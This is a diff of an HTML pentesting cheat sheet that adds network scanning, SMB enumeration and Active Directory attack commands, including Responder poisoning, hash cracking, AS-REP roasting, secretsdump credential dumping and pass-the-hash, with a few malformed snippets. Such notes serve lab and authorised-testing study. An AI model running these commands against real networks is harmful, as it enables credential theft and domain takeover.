@@ -5,6 +5,8 @@
         <h1>Checklist</h1>
 
         <p>
+            <span class="submenu"><a href="#scan">Scan</a></span>
+            <span class="submenu"><a href="#vulnservices">Common vulnerable services</a></span>
             <span class="submenu"><a href="#enumeration">Enumeration</a></span>
             <span class="submenu"><a href="#commonvuln">Common web vulnerabilities</a></span>
             <span class="submenu"><a href="#adenumeration">AD Enumeration</a></span>
@@ -13,8 +15,73 @@
             <span class="submenu"><a href="#privesclinux">Privesc Linux</a></span>
             <span class="submenu"><a href="#privescwindows">Privesc Windows</a></span>
         </p>
-
         <hr><br>
+<!-- Scan -->
+        <h2 style="text-align: center;" id="scan">Scan</h2>
+        <table style="width: 60%;">
+            <tr>
+                <th>Steps</th>
+                <th>Snippets</th>
+            </tr>
+
+            <tr style="background-color: white;">
+                <td><strong>ICPM scan of the network</strong> - Fast IP detection on the network</td>
+                <td><span class="snippet">nmap -sP 10.10.10.0/24</span></td>     
+            </tr>
+            <tr style="background-color: white;">
+                <td><strong>NetBios scan of the network</strong> - Very fast IP detection on the network, convenient for large Windows env</td>
+                <td><span class="snippet">nbtscan -sP 10.10.0.0/16</span></td>     
+            </tr>
+            <tr style="background-color: white;">
+                <td><strong>TCP scan of the network</strong> - Detailed IP detection on the network</td>
+                <td><span class="snippet">nmap 10.10.10.0/24</span></td>     
+            </tr>
+            <tr style="background-color: lightgrey;">
+                <td></td>
+                <td></td>
+            </tr>
+            <tr style="background-color: white;">
+                <td><strong>TCP scan</strong> - Fast scan of a machine (common ports)</td>
+                <td><span class="snippet">nmap 10.10.10.2</span></td>     
+            </tr>
+            <tr style="background-color: white;">
+                <td><strong>TCP scan</strong> - all ports</td>
+                <td><span class="snippet">nmap 10.10.10.2 -p-</span></td>     
+            </tr>
+            <tr style="background-color: white;">
+                <td><strong>TCP scan</strong> - services details</td>
+                <td><span class="snippet">nmap 10.10.10.2 -sV</span></td>     
+            </tr>
+            <tr style="background-color: white;">
+                <td><strong>TCP scan</strong> - detailed informations</td>
+                <td><span class="snippet">nmap 10.10.10.2 -A</span></td>     
+            </tr>
+            <tr style="background-color: white;">
+                <td><strong>UDP scan</strong> - UDP protocols</td>
+                <td><span class="snippet">sudo nmap 10.10.10.2 -sU</span></td>     
+            </tr>
+        </table>
+
+<!-- Common vulnerable services -->
+        <h2 style="text-align: center;" id="vulnservices">Common vulnerable services</h2>
+        <table style="width: 60%;">
+            <tr>
+                <th>Service</th>
+                <th>Port</th>
+                <th>Snippets</th>
+            </tr>
+            <tr style="background-color: white;">
+                <td><strong>Samba</strong></td>
+                <td>139, 445</td>
+                <td>
+                    <span class="snippet">enum4linux -a target_ip</span><br> 
+                    <span class="snippet">nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse target_ip</span><br> 
+                    <span class="snippet">smbclient -L target_ip</span><br>
+                    Connect to a share : <span class="snippet">smbclient//target_ip/share_name</span><br>
+                    Writing rights on the share ? Use the 'put' command to inject a payload
+                </td>     
+            </tr>
+        </table>
 <!-- Enumeration -->
         <h2 style="text-align: center;" id="enumeration">Enumeration</h2>
 
@@ -170,17 +237,90 @@
             <th>Steps</th>
             <th>Snippets</th>
         </tr>
+
         <tr style="background-color: white;">
-            <td></td>
-            <td><span class="snippet"></span></td>     
+            <td>
+                <strong>Listen trafic</strong> on internal network<br>
+                ARP protocol gives possible IP targets<br>
+                MDNS protocol gives host names as possible targets<br>
+                fping discovers ip's on the internal network
+            </td>
+            <td>
+                <span class="snippet">sudo wireshark</span><br>
+                <span class="snippet">sudo tcpdump</span><br>
+                <span class="snippet">fping -asgq 10.10.5.0/24</span><br>
+            </td>     
         </tr>
+        <tr style="background-color: white;">
+            <td>
+                <strong>Listen and poisoning</strong> (catching auth challenges) AD network<br>
+                Then crack collected hashes with hashcat
+            </td>
+            <td>
+                <span class="snippet">sudo responder -I the_network_interface_name</span><br>
+                <span class="snippet">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</span>
+            </td>     
+        </tr>
+        <tr style="background-color: white;">
+            <td>
+                <strong>Scan</strong> discovered hosts to find vulnerable services<br>
+            </td>
+            <td>
+                <span class="snippet">nmap ip_target</span><br>
+            </td>     
+        </tr>
+
+        <tr style="background-color: lightgrey;">
+            <td></td>
+            <td></td>     
+        </tr>
+
+        <tr style="background-color: white;">
+            <td>Anonymous <strong>LDAP request</strong> on a domain controler</td>
+            <td>
+                <span class="snippet">ldapsearch -x -H ldap://ip_target -s base -LLL</span><br>
+                <strong>RootDomainNamingContext</strong> gives the root domain name<br>
+                <strong>dnsHostName</strong> gives the name of the domain controler
+            </td>     
+        </tr>
+        <tr style="background-color: white;">
+            <td>Check <strong>Kerberos</strong> service availability (always on a DC)</td>
+            <td>
+                <span class="snippet">nmap -88 ip_target -sV</span><br>
+                <span class="snippet">nmap -88 10.10.10.0/24</span> (helps to identify the DC server ip)<br>
+            </td>     
+        </tr>
+
+        <tr style="background-color: lightgrey;">
+            <td></td>
+            <td></td>     
+        </tr>
+
         <tr style="background-color: white;">
             <td>Brute force an AD service with default user to <strong>obtain a list of users</strong></td>
-            <td><span class="snippet">nxc smb target_ip -u "guest" -p "" --rid-brute</span></td>     
+            <td>
+                <span class="snippet">nxc smb target_ip -u "guest" -p "" --rid-brute</span><br>
+                <span class="snippet">/Tools/kerbrute/dist/kerbute_linux_amd64 userenum --dc ip_domain_controller -d domain.local userswordlist.txt</ip_target></span>
+            </td>     
         </tr>
         <tr style="background-color: white;">
-            <td></td>
-            <td><span class="snippet"></span></td>     
+            <td>Get <strong>hashed creds</strong> (when no pre-auth required)</td>
+            <td>
+                <span class="snippet">/Tools/impacket/examples/GetNPUsers.py domain.local/ -usersfile wordlist.txt -format john -outputfile mon_fichier</span><br>
+            </td>     
+        </tr>
+        </tr>
+        <tr style="background-color: white;">
+            <td>Get <strong>hashed creds</strong> (when rights of a known user are required)</td>
+            <td>
+                <span class="snippet">/Tools/impacket/examples/secretsdump.py -just-dc the_user:his_password@domain.local</span><br>
+            </td>     
+        </tr>
+        <tr style="background-color: white;">
+            <td><strong>Pass the hash</strong> (hash credentials required)</td>
+            <td>
+                <span class="snippet">evil-winrm -i target_ip -H target_hash --user target_user</span><br>
+            </td>     
         </tr>
     </table>
 <!-- New service found -->
@@ -197,7 +337,7 @@
             </tr>
             <tr style="background-color: white;">
                 <td>What are the <strong>default credentials<strong (if a login is needed) ?</td>
-                <td><span class="snippet"></span></td>     
+                <td><span class="snippet">creds search service_name</span></td>     
             </tr>
             <tr style="background-color: white;">
                 <td>Does the service appears in <strong>searchploit</strong> DB (or metasploit) ?</td>
@@ -231,6 +371,10 @@
             </tr>
             <tr style="background-color: white;">
                 <td>Last solution</td>
+                <td></td>     
+            </tr>
+            <tr style="background-color: white;">
+                <td>User as pass ?</td>
                 <td></td>     
             </tr>
         </table>
